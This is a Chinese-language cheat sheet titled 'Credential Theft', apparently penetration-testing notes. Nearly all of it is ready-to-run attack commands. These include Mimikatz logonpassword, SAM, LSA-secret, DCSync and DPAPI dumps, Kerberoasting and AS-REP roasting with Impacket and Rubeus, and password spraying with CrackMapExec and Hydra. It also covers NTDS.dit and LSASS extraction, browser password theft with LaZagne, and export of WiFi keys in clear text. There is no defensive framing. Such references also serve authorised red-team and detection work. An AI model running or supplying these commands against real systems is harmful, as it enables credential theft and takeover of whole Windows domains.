# 凭证窃取

## 1. Mimikatz

```bash
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::dcsync /domain:target.com /all
```

### 常用命令

```bash
# 导出所有凭证
sekurlsa::logonpasswords

# 导出SAM数据库
lsadump::sam

# 导出LSA Secrets
lsadump::secrets

# DCSync攻击
lsadump::dcsync /domain:target.com /user:krbtgt

# 导出票据
kerberos::list
kerberos::ppt ticket.kirbi
```

---

## 2. Kerberoasting

### 使用Impacket

```bash
GetUserSPNs.py -request domain/user:password
GetUserSPNs.py -request -hashes :NTLMHASH domain/user@target
```

### 使用Rubeus

```bash
Rubeus.exe kerberoast
```

---

## 3. AS-REP Roasting

### 使用Impacket

```bash
GetNPUsers.py -usersfile users.txt -format hashcat
GetNPUsers.py domain/ -request
```

### 使用Rubeus

```bash
Rubeus.exe asreproast
```

---

## 4. 密码喷洒

### 使用CrackMapExec

```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123
```

### 使用Hydra

```bash
hydra -L users.txt -p Password123 smb://target_ip
```

---

## 5. SAM数据库导出

### 本地导出

```bash
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

### 使用Mimikatz

```bash
lsadump::sam
```

### 使用CrackMapExec

```bash
crackmapexec smb target_ip -u admin -p password --sam
```

---

## 6. NTDS.dit导出

### 使用Impacket

```bash
secretsdump.py domain/user:password@dc_ip
secretsdump.py -hashes :NTLMHASH 'domain/user@dc_ip'
```

### 使用NTDSDumpEx

```bash
NTDSDumpEx.exe -d C:\ -o output
```

---

## 7. LSASS凭证导出

### 使用Mimikatz

```bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### 使用CrackMapExec

```bash
crackmapexec smb target_ip -u admin -p password --lsa
```

---

## 8. 浏览器凭证

### 使用LaZagne

```bash
laZagne.exe browsers
```

### 使用BrowserDump

```bash
browserdump.exe
```

---

## 9. WiFi凭证

```bash
netsh wlan show profiles
netsh wlan export profile folder=. key=clear
```

---

## 10. DPAPI凭证

### 使用Mimikatz

```bash
dpapi::cred /in:credential
dpapi::cred /in:credential /unprotect
```
